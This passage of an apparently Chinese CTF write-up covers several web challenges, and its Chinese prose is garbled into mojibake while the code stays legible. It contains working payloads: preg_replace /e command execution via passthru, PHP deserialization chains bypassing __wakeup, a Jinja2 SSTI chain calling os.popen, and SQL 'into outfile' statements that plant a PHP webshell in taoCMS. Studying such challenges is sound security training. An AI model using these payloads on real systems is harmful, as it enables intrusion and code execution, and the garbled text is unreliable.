å‡½æ•°çš„æ–¹å¼æ‰§è¡Œï¼Œå‰ææ˜¯ subject ä¸­æœ‰ pattern çš„åŒ¹é…ã€‚ æ—¢ç„¶æ˜¯è¿™æ ·æˆ‘ä»¬çœ‹ä¸€å¼ å›¾ã€‚ å›¾ä¸­å®é™…ä¸Šé€šè¿‡ eval æ‰§è¡Œçš„æ˜¯ strtolower å‡½æ•°ã€‚åˆ†åˆ«å®é™…æ‰§è¡Œçš„æ˜¯ï¼š strtolower(\"JUST TEST\"); strtolower(\"PHPINFO()\"); strtolower(\"{${PHPINFO()}}\"); ç¬¬ä¸‰ä¸ªä¹‹æ‰€ä»¥å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬é€šè¿‡å¤æ‚(èŠ±æ‹¬å·)è¯­æ³•çš„æ–¹å¼æ¥è®©å…¶ä»£ç æ‰§è¡Œã€‚ ç„¶ååœ¨çœ‹ï¼šè¿™é‡Œçš„ replacement æ˜¯ strtolower(â€œ\\\\1â€) ï¼Œç€é‡ç†è§£ä¸€ä¸‹ \\\\1 ã€‚ \\\\1 åœ¨æ­£åˆ™ä¸­å­˜åœ¨è‡ªå·±çš„ä½œç”¨ï¼Œå…¶å®å°±æ˜¯åŒ¹é…ç¬¬ä¸€é¡¹ è¿™é‡Œç»™å‡ºä¾‹å­ preg_replace('/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value); regexæ˜¯æˆ‘ä»¬çš„å‚æ•°å€¼ å³ getçš„åç§° valueæ˜¯ä¼ å…¥çš„å‚æ•° .*=phpinfo() æ‰€ä»¥å°±å˜ä¸ºäº† preg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")',phpinfo()); ä½†è¿™é‡Œæ— æ³•æ‰§è¡Œphpinfo() è¦å˜ä¸ºï¼š{${phpinfo()}}ï¼Œé¦–å…ˆè¦çŸ¥é“ $a=hello $$a=world è¿™é‡Œç›¸å½“äº $hello=world æ‰€ä»¥ echo $a $hello ä¸ºï¼šhello world æˆ‘ä»¬æ¥ç€ç†è§£ä¸€ä¸‹ ${phpinfo()} æ‰§è¡Œå®Œä¼šå˜ä¸º ${1} å› ä¸º phpinfo()é€šè¿‡var_dumpè¿”å›çš„æ˜¯1 æ‰€ä»¥strtolower å˜ä¸º strtolower({${1}}) æ¥ç€å˜ä¸º strtolower({null}) ä½†ä¼¼ä¹åé¢çš„å¯¹strtolowerçš„è§£é‡Šæ— å…³ç´§è¦ï¼Œæˆ‘è®¤ä¸ºä¹‹ä¸»è¦æ³¨æ„é€šè¿‡${}æ¥è§£æphpinfo()ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä½†æœ‰æ³¨æ„åˆ°PHPçš„ç‰¹æ€§ä¼šå°†.è¿™ç±»ç‰¹æ®Šç¬¦å·è½¬åŒ–ä¸º_ï¼Œå› æ­¤é‚£äº›ä½¬å°±æ¢ä¸ºäº†\\S*ï¼ˆæˆ‘ä¸äº†è§£æ­£åˆ™è¡¨è¾¾å¼ï¼Œå› æ­¤é—®äº†GPTï¼‰å‘ç°ä»–ä¿©ä½œç”¨åœ¨è¿™é‡Œæ˜¯ç›¸é€šçš„ï¼Œä¸è¿‡æŸäº›ç»†èŠ‚ä¸ä¸€è‡´ç½¢äº† /(.*)/: è¿™éƒ¨åˆ†æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•´ä¸ªè¾“å…¥å­—ç¬¦ä¸²ï¼Œå¹¶æ•è·å®ƒåˆ°ä¸€ä¸ªåˆ†ç»„ä¸­ã€‚ .* åŒ¹é…ä»»æ„å­—ç¬¦ï¼ˆé™¤äº†æ¢è¡Œç¬¦ ï¼‰ï¼Œ.* çš„æ‹¬å· ( ) å°†åŒ¹é…çš„å†…å®¹æ•è·åˆ°ä¸€ä¸ªåˆ†ç»„ä¸­ï¼Œä»¥åå¯ä»¥åœ¨æ›¿æ¢ä¸­ä½¿ç”¨ã€‚ (\\S*)ï¼šè¿™ä¸ªéƒ¨åˆ†è¡¨ç¤ºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªéç©ºç™½å­—ç¬¦ï¼ˆéç©ºæ ¼ã€éåˆ¶è¡¨ç¬¦ã€éæ¢è¡Œç¬¦ç­‰ï¼‰ï¼Œå¹¶å°†å…¶æ•è·åˆ°åˆ†ç»„ä¸­ã€‚ ç„¶åæˆ‘ä»¬å°±å¯ä»¥æƒ³åˆ°æ„é€ å¦‚ä¸‹payloadï¼š GETï¼šcode={${passthru(ls)}} POSTï¼špattern=\\S* ä¸è¿‡è€ƒè™‘åˆ°è¿‡æ»¤çš„å¾ˆå¤šï¼Œæˆ‘å°±å°†å…¶æ¢ä¸ºäº†ASCIIç å€¼æ¥æ›¿æ¢ï¼Œè„šæœ¬å¦‚ä¸‹ # è¾“å…¥å­—ç¬¦ä¸² input_str = \"ls\" # åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²æ¥å­˜å‚¨ç»“æœ output_str = \"\" # éå†è¾“å…¥å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦ for char in input_str: # è·å–å­—ç¬¦çš„ ASCII ç å€¼ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸² ascii_value = ord(char) # æ ¼å¼åŒ–è¾“å‡ºï¼Œæ‹¼æ¥åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ output_str += f\"chr({ascii_value}).\" # å»é™¤æœ€åä¸€ä¸ªå¤šä½™çš„ç‚¹å· output_str = output_str.rstrip(\".\") # æ‰“å°ç»“æœ print(output_str) ç»“æœä¸ºï¼šls-&gt;chr(108).chr(115) ls /-&gt;chr(108).chr(115).chr(32).chr(47) ç­‰ç­‰ æœ€ç»ˆpayloadä¸ºï¼š code=${passthru(chr(99).chr(97).chr(116).chr(32).chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112))} pattern=\\S* æ‰¾åˆ°flag ä½†è¿™é‡Œä¸æ‡‚å¾—ç‚¹ä¸ºï¼šä¼¼ä¹éå¾—è½¬æ¢ä¸ºASCIIæ‰èƒ½æ‰§è¡ŒæˆåŠŸ [WEEK2]no_wake_up ç›´æ¥ç‚¹å‡»çœ‹çœ‹ï¼Œç®€å•çš„ååºåˆ—åŒ– &lt;?php highlight_file(__FILE__); class flag{ public $username; public $code; public function __wakeup(){ $this-&gt;username = \"guest\"; } public function __destruct(){ if($this-&gt;username = \"admin\"){ include($this-&gt;code); } } } unserialize($_GET['try']); é¦–å…ˆå°±æ˜¯æ‰¾æ•æ„Ÿå‡½æ•°ï¼Œå¾ˆæ˜¾ç„¶ä¸ºincludeï¼Œè¿™ä¸ªå¯ä»¥äº§ç”Ÿæ–‡ä»¶åŒ…å«æ¼æ´ã€‚é‚£æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è°ƒç”¨è¯¥å‡½æ•°æ‰€åœ¨æ–¹æ³•ï¼šdestructï¼Œè¿™ä¸ªå‡½æ•°ä¼šåœ¨å¯¹è±¡è¢«é”€æ¯çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œå¹¶ä¸”åªè¦æ»¡è¶³username=adminå³å¯ã€‚ä½†åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œç”±äºä¼šè‡ªåŠ¨è°ƒç”¨wakeupæ–¹æ³•è€Œä½¿usernameè¢«èµ‹å€¼ä¸ºguestï¼Œè¿™æ ·ä¼šå¯¼è‡´username!=adminè€Œæ— æ³•è°ƒç”¨includeå‡½æ•°ã€‚å› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•ç»•è¿‡wakeupæ–¹æ³•çš„è°ƒç”¨ åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ æˆ‘ä»¬ç›´æ¥çœ‹pocæ¥ç†è§£ä¸Šå¥è¯ &lt;?php highlight_file(__FILE__); class flag{ public $username; public $code; } $poc = new flag(); $poc-&gt;username = 'admin'; $poc-&gt;code = 'php://filter/convert.base64-encode/resource=flag.php'; echo serialize($poc); ?&gt; è¾“å‡ºå¦‚ä¸‹ï¼š O:4:\"flag\":2:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";} æˆ‘ä»¬åªä¿®è¦åšå¦‚ä¸‹æ›´æ”¹ï¼Œå°†ä¸Šè¿°çš„2æ”¹ä¸ºå…¶ä»–æ•°å­—å³å¯ï¼ˆè¿™é‡Œæˆ‘æ”¹æˆäº†3ï¼‰ï¼š O:4:\"flag\":3:{s:8:\"username\";s:5:\"admin\";s:4:\"code\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";} base64è§£ç å³å¯ï¼Œå¦‚ä¸‹å›¾æ‹¿åˆ°flag [WEEK2]ez_ssti ç»å…¸é¡µé¢ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¼æ¥urlçœ‹çœ‹ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ˜¯çŒœæµ‹éœ€è¦getä¼ å‚nameï¼Œå¦‚ä¸‹å›¾ å‘ç°è¢«æˆåŠŸè§£ææ‰§è¡Œï¼Œé‚£æˆ‘ä»¬è·Ÿç€å¸¸è§„æ€è·¯ä¸€æ­¥æ­¥å°è¯• 1.é¦–å…ˆè€ƒè™‘æ‹¿åˆ°ä¸€ä¸ªclassï¼Œé€šè¿‡å­—ç¬¦ä¸²ã€å…ƒç»„ã€åˆ—è¡¨ã€å­—å…¸å‡å¯ã€‚ {{''.__class__}} #è¿™é‡Œæˆ‘é€‰æ‹©å­—ç¬¦ä¸² 2.ä¸‹ä¸€æ­¥ç›®çš„æ˜¯æ‹¿åˆ°objectåŸºç±»ã€‚ {{''.__class__.__base__}} 3.ç„¶åè·å–å¯¹åº”å­ç±»ã€‚ {{''.__class__.__base__.__subclasses__()}} æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å¯ç”¨çš„ç±»ï¼Œæ¯”å¦‚å‘½ä»¤æ‰§è¡Œç±»ï¼Œæ–‡ä»¶è¯»å†™ç±»ç­‰ç­‰ï¼Œè¿™é‡Œå¯ä»¥å…¨å±€æœç´¢æˆ–è€…å†™ä¸€ä¸ªè„šæœ¬æ¥æœç´¢ è¿™é‡Œæ‰¾åˆ°ä¹‹åå‘ç°&lt;class â€˜os._wrap_closeâ€™&gt;æ˜¯ä½äºç¬¬132ä¸ªï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨å³å¯ 5.é€šè¿‡æŸäº›æ‰‹æ®µæ‰¾åˆ°æŸä¸ªå‡½æ•°æ˜¯å¯ç”¨çš„ï¼Œä¸‹ä¸€æ­¥åˆ©ç”¨è¿™ä¸ªç±»çš„__init__å‡½æ•°è·å–åˆ°__globals__å…¨å±€å˜é‡ï¼Œå†è·å–åˆ°__globals__å…¨å±€å˜é‡é‡Œçš„__builtins__ä¸­çš„evalå‡½æ•°ã€‚ éšåå¯¼å…¥osæ¨¡å—åˆ©ç”¨popenå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"ls /\").read()')}} å¦‚å›¾æ ¹ç›®å½•å‘ç°flagï¼Œç›´æ¥è¯»å–å³å¯ [WEEK2]EasyCMS ç‚¹å¼€æ˜¯ä¸€ä¸ªç½‘ç«™å†…å®¹ç®¡ç†ç³»ç»Ÿå«åštaoCMSï¼Œé‚£æˆ‘çš„æ€è·¯æ˜¯ç›´æ¥ç™¾åº¦çœ‹çœ‹æœ‰ä½•æ¼æ´ï¼Œå°è¯•å¤ç°åˆ©ç”¨ ç™¾åº¦ä¹‹åæœ‰å¾ˆå¤šæ–‡ç« ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ç›®å‰æµ‹è¯•è¿‡çš„å¯ä»¥åˆ©ç”¨sqlæ³¨å…¥ä»¥åŠæ–‡ä»¶ä¸Šä¼ ï¼Œä¸€ä¼šå„¿å‚è€ƒæ–‡ç« æ”¾åœ¨ä¸‹é¢ï¼Œå¼€å§‹å¤ç°ï¼š é¦–å…ˆçœ‹äº†ç™¾åº¦çš„æ–‡ç« å‘ç°äº†åå°ç®¡ç†è·¯å¾„ /admin/admin.php?action=frame&amp;ctrl=iframes ç›´æ¥è®¿é—®çœ‹çœ‹ å‘ç°è¦ç™»å½•ï¼Œä¸è¿‡è¿™é‡Œå¾ˆå¹¸è¿åˆ©ç”¨ç½‘ç«™çš„é»˜è®¤å¯†ç å°±è¿›å»äº†ï¼šadminï¼Œtao æ–¹æ³•ä¸€ï¼šsqlå‘½ä»¤æ‰§è¡Œ è¿›å…¥åå°å¦‚ä¸Šå›¾ä¼šæœ‰ä¸¤å¤„åˆ©ç”¨ç‚¹ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡ŒSQLï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶ç®¡ç†ã€‚æˆ‘ä»¬å…ˆçœ‹sqlå§ï¼Œè¿™é‡Œæ²¡æœ‰è¿‡æ»¤ï¼Œæˆ‘ä»¬ç›´æ¥å°è¯•sqlè¯­å¥å‘ç½‘ç«™ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ select \"&lt;?php @eval($_POST[1];?&gt;)\" into outfile '/var/www/html/flag.php' æˆ– select \"&lt;?php system('cat /flag');?&gt;)\" into outfile '/var/www/html/flag.php' å†™å…¥åç›´æ¥urlåé¢è®¿é—®ä¸Šè¿°æ–‡ä»¶å³å¯ è¿™é‡Œæˆ‘å¤±è¯¯äº†ï¼Œäºæ˜¯åˆå†™äº†ä¸€ä¸ªcat.phpï¼Œä¸ç”¨åœ¨æ„ç›´æ¥æ‹¿åˆ°flag æ–¹æ³•äºŒï¼šæ–‡ä»¶ä¸Šä¼  ç›´æ¥ç‚¹å‡»æ–‡ä»¶ç®¡ç† å¦‚ä¸Šå›¾ï¼Œæˆ‘çœ‹è®¸å¤šæ–‡ä»¶éƒ½ä¼šåœ¨htaccessæ–‡ä»¶ä¸­å†™å…¥ AddType application/x-httpd-php .php3 æ¥ç¡®ä¿ç³»ç»Ÿä¼šä»¥phpè§£æphp3åç¼€æ–‡ä»¶ï¼Œäºæ˜¯ç›´æ¥å‘php3æ–‡ä»¶å†™å…¥ä¸€å¥è¯æœ¨é©¬æ¥åˆ©ç”¨ ä½†æˆ‘è¿™é‡Œå†™å…¥ä¹‹åè®¿é—®ä¼šå‘ç°ç›´æ¥ä¸‹è½½äº†ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºè¿™ä¸ªç‚¹åœ¨è¿™é‡Œå¹¶ä¸èƒ½åˆ©ç”¨ï¼Œä¸è¿‡æˆ‘ä»¬ç›´æ¥å‘åå°åˆ›å»ºå†™å…¥ä¸€ä¸ªphpæœ¨é©¬æ–‡ä»¶å³å¯ï¼Œä¸éœ€è¦ä¸Šè¿°é‚£æ ·éº»çƒ¦ å¦‚ä¸Šå›¾æˆ‘ä»¬ç›´æ¥è®¿é—® å¯ä»¥çœ‹åˆ°æˆåŠŸè§£æï¼Œåç»­å°±ä¸å†èµ˜è¿°äº† ä¸Šè¿°å¤ç°å¯å‚è€ƒï¼šæ˜¥ç§‹äº‘å¢ƒï¼šCVE-2022-23880ï¼ˆtaoCMS v3.0.2 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰ å‚è€ƒæ–‡ç«  [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤ preg_replace /eæ¨¡å¼æ¼æ´ [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤ https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace(%27/(%27%20.%20 [WEEK2]serialize &lt;?php highlight_file(__FILE__); class misca{ public $gao; public $fei; public $a; public function __get($key){ $this-&gt;miaomiao(); $this-&gt;gao=$this-&gt;fei; die($this-&gt;a); } public function miaomiao(){ $this-&gt;a='Mikey Mouse~'; } } class musca{ public $ding; public $dong; public function __wakeup(){ return $this-&gt;ding-&gt;dong; } } class milaoshu{ public $v; public function __tostring(){ echo\"misca~musca~milaoshu~~~\"; include($this-&gt;v); } } function check($data){ if(preg_match('/^O:\\d+/',$data)){ die(\"you should think harder!\"); } else return $data; } unserialize(check($_GET[\"wanna_fl.ag\"])); è™½ç„¶æ˜¯ç®€å•çš„ååºåˆ—åŒ–ï¼Œä½†å…¶ä¸­è¿˜æ˜¯å¾ˆå¤šè€ƒç‚¹çš„ã€‚æˆ‘ä»¬å…ˆæ€»ä½“åˆ†æä¸€æ³¢ã€‚ è€æ€è·¯å…ˆæ‰¾æ•æ„Ÿå‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯includeå‡½æ•°äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å¦‚ä½•åˆ©ç”¨å…¶æ‰€åœ¨çš„tostringé­”æœ¯æ–¹æ³•ï¼š æœå¯»ä¸€ç•ªå‘ç°geté­”æœ¯æ–¹æ³•é‡Œé¢å­˜åœ¨die(å˜é‡)æ„æ€æ˜¯ç¨‹åºç»“æŸå‰å°†è¯¥å˜é‡ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºï¼Œé‚£ä¸å°±æ¥äº†å˜›ï¼Œè¿™é‡Œæ˜¾ç„¶å°±æ˜¯è°ƒç”¨tostringçš„ç‚¹ã€‚ æ¥ä¸‹æ¥çœ‹å¦‚ä½•è°ƒç”¨geté­”æœ¯æ–¹æ³•ï¼š __get()ï¼Œè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶è°ƒç”¨ é‚£æ ¹æ®ä¸Šè¿°åˆ©ç”¨æ¡ä»¶æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°wakeupé­”æœ¯æ–¹æ³•ä¸­çš„returnè¯­å¥ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„ç‚¹ï¼Œè‡³äºwakeupçš„æ–¹æ³•è°ƒç”¨å¾ˆç®€å•ï¼Œååºåˆ—åŒ–å³å¯ã€‚ ç»¼ä¸Šæ‰€è¿°é“¾å­ä¸ºï¼šmusca.wakeup-&gt;misca.get-&gt;milaoshu.tostring-&gt;include æ¥ä¸‹æ¥å°±æ˜¯èµ‹å€¼é—®é¢˜äº†ï¼Œè¿™é‡Œå…ˆä¸Špop &lt;?php class misca{ public $gao; public $fei; public $a; } class musca{ public $ding; public $dong; } class milaoshu{ public $v; } $poc = new musca(); $poc-&gt;ding = new misca(); $poc-&gt;ding-&gt;fei = new milaoshu(); $poc-&gt;ding-&gt;a = &amp;$poc-&gt;ding-&gt;gao; $poc-&gt;ding-&gt;fei-&gt;v = 'php://filter/convert.base64-encode/resource=flag.php'; echo serialize(array($poc)); ?&gt; è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°ä¸Šè¿°é‡‡ç”¨äº†å¼•ç”¨çš„ç‚¹ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†ç»•è¿‡miscaå¯¹è±¡ä¸­miaomiaoå‡½æ•°å¯¹å…¶aå±æ€§çš„å€¼çš„æ”¹å˜ã€‚ å‰©ä¸‹çš„è¿˜æœ‰ç»•è¿‡æœ€å¼€å§‹çš„æ­£åˆ™æ£€æµ‹ï¼Œè¿™é‡Œå½“æ—¶æˆ‘æ˜¯ç›´æ¥ä¿®æ”¹å‰é¢çš„O:5ä¸ºO:+5ï¼Œè¿™ä¸ªå…¶å®æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œä¸è¿‡å¾ˆå¥‡æ€ªè¿™é“é¢˜æ‰“ä¸é€šï¼Œåæ¥æ€ç´¢äº†ä¸€ç•ªå‘ç°ï¼Œç”¨è¿™ç§åŠæ³•ä¼¼ä¹ä¼šç»ˆæ­¢ååºåˆ—åŒ–çš„è¿›ç¨‹ã€‚äºæ˜¯æ¢äº†ä¸€ç§æ–¹æ³•ï¼Œåªéœ€è¦ç”¨arrayåŒ…å›´è¦åºåˆ—åŒ–çš„å˜é‡å³å¯ã€‚å› ä¸ºè¯¥æ­£åˆ™å°±æ˜¯æ£€éªŒåºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´ã€‚â€“è¿™é‡Œçœ‹äº†å®˜æ–¹wpçš„è§£é‡Šæ˜¯ï¼š+è¿™ç§æ–¹å¼ä¼šå—åˆ°PHPç‰ˆæœ¬é™åˆ¶ æœ€åå°±æ˜¯ä¼ å‚é—®é¢˜äº†ï¼Œè¿™é‡Œéœ€è¦ä»¥wanna[fl.agè¿™ç§æ–¹å¼ä¼ å‚ï¼Œå¦‚ä¸‹å›¾è§£å¯†å³å¯å¾—åˆ°flag [WEEK2]MD5çš„äº‹å°±æ‹œæ‰˜äº† &lt;?php highlight_file(__FILE__); include(\"flag.php\"); if(isset($_POST['SHCTF'])){ extract(parse_url($_POST['SHCTF'])); if($$$scheme==='SHCTF'){ echo(md5($flag)); echo(\"&lt;/br&gt;\"); } if(isset($_GET['length'])){ $num=$_GET['length']; if($num*100!=intval($num*100)){ echo(strlen($flag)); echo(\"&lt;/br&gt;\"); } } } if($_POST['SHCTF']!=md5($flag)){ if($_POST['SHCTF']===md5($flag.urldecode($num))){ echo(\"flag is\".$flag); } } å½“æ—¶è¿™é“é¢˜ä¹Ÿæ˜¯å¾ˆè´¹è„‘å­ä¸”æ²¡åšå‡ºæ¥ã€‚ã€‚ã€‚å½“æ—¶å¯¹äº$$$schemeè¿™ä¸€å—å„¿èµ°é€šäº†ï¼Œä½†åœ¨æœ€åçš„md5æ¯”è¾ƒå°±ä¸æ‡‚äº†ï¼Œå¦‚ä»Šwpå‡ºæ¥äº†ï¼Œå­¦ä¹ ä¸€æ³¢ã€‚ çœ‹äº†ä¹‹åå‘ç°æ˜¯è€ƒå¯Ÿmd5è¡¥å……æ”»å‡»ã€‚ã€‚ã€‚æ²¡å¬è¯´è¿‡ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆæ‹¿åˆ°flagçš„md5å€¼å’Œé•¿åº¦å†è¯´ã€‚ è¿™é‡Œå…³é”®å°±æ˜¯extractä¸parse_urlå‡½æ•°çš„é…åˆäº† è¿™é‡Œè®¤çœŸçœ‹ä¸Šé¢çš„ä»£ç æˆ‘è®¤ä¸ºå°±å¯ä»¥ç†è§£äº†ï¼Œè¿™é‡Œextractå‡½æ•°å°±æ˜¯å°†é”®åä½†æœ€å˜é‡ï¼Œé”®å€¼å½“åšå˜é‡çš„å€¼è€Œå·²ï¼Œæ‰€ä»¥é‡ç‚¹æ˜¯ç†è§£parse_urlå‡½æ•°ï¼Œçœ‹é¢˜ç›®è¦æ±‚æˆ‘ä»¬$$$schema=æŒ‡å®šå­—ç¬¦ä¸²ï¼Œ$num*100!=intval($num*100)åé¢çš„æˆ‘ä»¬ç”¨æµ®ç‚¹ç±»å‹å³å¯ç»•è¿‡ï¼Œè€Œå‰é¢çš„payloadå¦‚ä¸‹ SHCTF=host://SHCTF:password@user length=1.1 å¾—åˆ°md5å€¼å’Œé•¿åº¦åˆ†åˆ«ä¸ºï¼š 8504ce3799001a7aecb62ec74d3835a5 42 è¿™é‡Œå°±å…ˆç›´æ¥å¤ç°ä¸€æ³¢ï¼Œåç»­åŸç†çš„å­¦ä¹ å¦èµ·ä¸€ç¯‡æ–‡ç« ï¼Œæ¼æ´åˆ©ç”¨å·¥å…·å¦‚ä¸‹ï¼š https://github.com/shellfeel/hash-ext-attack ä¸‹è½½zipå®‰è£…ç›¸å…³ä¾èµ–ï¼Œç›´æ¥è¿è¡Œpyæ–‡ä»¶ï¼Œæ ¹æ®æç¤ºè¾“å…¥å†…å®¹ è¿™é‡Œæˆ‘æ˜¯åªè¾“å…¥hashå’Œé•¿åº¦äº†ï¼Œä¹‹åä»–ç»™äº†æˆ‘ä»¬æ–°æ˜æ–‡ä»¥åŠhashï¼Œæˆ‘ä»¬åˆ†åˆ«ç»™lengthå’ŒSHCTFèµ‹å€¼å³å¯ æ‹¿åˆ°flag [WEEK2]ez_rce æš‚æ—¶ä¸ä¼šã€‚ã€‚ã€‚ å’³å’³æ¥è¡¥å……äº†ï¼ˆé å®˜æ–¹wp from flask import * import subprocess app = Flask(__name__) #æ­¤å‡½æ•°ç”¨äºéå†å¹¶ä»å¯¹è±¡ä¸­æå–å±æ€§ã€‚å®ƒæ¥å—ä¸€ä¸ªå¯¹è±¡ï¼ˆobjï¼‰å’Œå±æ€§åç§°çš„åˆ—è¡¨ï¼ˆargï¼‰ï¼Œç„¶åè¿”å›æœ€ç»ˆå±æ€§ã€‚ def gett(obj,arg): tmp = obj for i in arg: tmp = getattr(tmp,i) return tmp #è¿™ä¸ªå‡½æ•°ç±»ä¼¼äºgettï¼Œä½†ç”¨äºè®¾ç½®ä¸€ä¸ªå…·æœ‰æŒ‡å®šå€¼ï¼ˆnumï¼‰çš„å±æ€§ã€‚ def sett(obj,arg,num): tmp = obj for i in range(len(arg)-1): tmp = getattr(tmp,arg[i]) setattr(tmp,arg[i+1],num) #å®ƒä»subprocessä¸­æå–ç‰¹å®šå±æ€§ï¼Œå°†å…¶è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œä½¿ç”¨ç»™å®šçš„ç´¢å¼•numå’Œå¸ƒå°”å€¼bolä¿®æ”¹åˆ—è¡¨ä¸­çš„ç‰¹å®šå…ƒç´ ï¼Œç„¶åå°†å±æ€§è®¾ç½®å›ä¿®æ”¹åçš„åˆ—è¡¨ã€‚ def hint(giveme,num,bol): c = gett(subprocess,giveme) tmp = list(c) tmp[num] = bol tmp = tuple(tmp) sett(subprocess,giveme,tmp) #è¿™ä¸ªå‡½æ•°ç”¨äºä½¿ç”¨subprocess.callæ–¹æ³•æ‰§è¡ŒShellå‘½ä»¤ã€‚ def cmd(arg): subprocess.call(arg) @app.route('/',methods=['GET','POST']) def exec(): try: if request.args.get('exec')=='ok': shell = request.args.get('shell') cmd(shell) else: exp = list(request.get_json()['exp']) num = int(request.args.get('num')) bol = bool(request.args.get('bol')) hint(exp,num,bol) return 'ok' except: return 'error' if __name__ == '__main__': app.run(host='0.0.0.0',port=5000) é™„ä»¶ç»™äº†æˆ‘ä»¬æºç ï¼Œè¿™é‡Œé…åˆGPTåšäº†ä¸€æ³¢å®¡è®¡ï¼Œä¸‹é¢é™„ä¸Šå…³é”®å‡½æ•°çš„ç”¨æ³•æˆªå›¾ï¼š è¿™é‡Œåˆ†æäº†ä¸€æ³¢ï¼Œæˆ‘ä»¬æ¥æä¸€ä¸‹æ€è·¯ï¼Œè¿™é‡Œçš„ä»£ç å¯ä»¥å®ç°ä¿®æ”¹subprocesså‡½æ•°çš„æŸäº›å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥æ¶æ„æ•°æ®å°±å¯ä»¥ä¿®æ”¹æˆ‘ä»¬æƒ³è¦çš„å±æ€§çš„å€¼äº†ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥jsonä¼ å…¥æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ä¼ å…¥subprocesså‡½æ•°çš„æŸäº›å‚æ•°ï¼Œéšånumå®šä½æˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„å‚æ•°ä½ç½®ï¼Œbolæ˜¯ä¿®æ”¹å‚æ•°çš„å¸ƒå°”å€¼ï¼Œè¿™æ ·ä¼ å…¥ä¹‹åå¯ä»¥é€šè¿‡gettï¼Œsettå‡½æ•°çš„é…åˆï¼Œå°†å‚æ•°çš„å¸ƒå°”å€¼ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„å¸ƒå°”å€¼ã€‚â€“è¿™é‡Œä¹Ÿæ˜¯é€šè¿‡wpå­¦åˆ°äº†ä¸€äº›å®¡è®¡ä»£ç çš„å°çŸ¥è¯†å§ã€‚æˆ‘ä»¬å°†ä»£ç é€šè¿‡pycharmæ‰“å¼€æ¥æœç´¢ä¸€äº›ä»£ç  å¦‚ä¸Šå›¾æˆ‘ä»¬çœ‹åˆ°æ•æ„Ÿå‡½æ•°callï¼Œæˆ‘ä»¬è·Ÿè¸ªçœ‹ä¸€ä¸‹ æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œæ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œä½†å®é™…æœ‰æ‰§è¡ŒåŠŸèƒ½çš„ä¼¼ä¹æ˜¯popenï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¸ªçœ‹ä¸€ä¸‹ æˆ‘ä»¬çœ‹åˆ°å…¶initå±æ€§ä¸­å­˜åœ¨è¯¸å¤šå‚æ•°ï¼Œå…¶ä¸­æœ‰shellçš„é»˜è®¤å€¼ä¸ºfalseï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®˜æ–¹çš„æç¤ºï¼š Subprocess.callå‡½æ•°æœ‰ä¸€ä¸ªå‚æ•°shellï¼Œå½“shellä¸ºTrueæ—¶ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶æ˜¯/bin/sh -c â€œ$cmdâ€è¿™æ 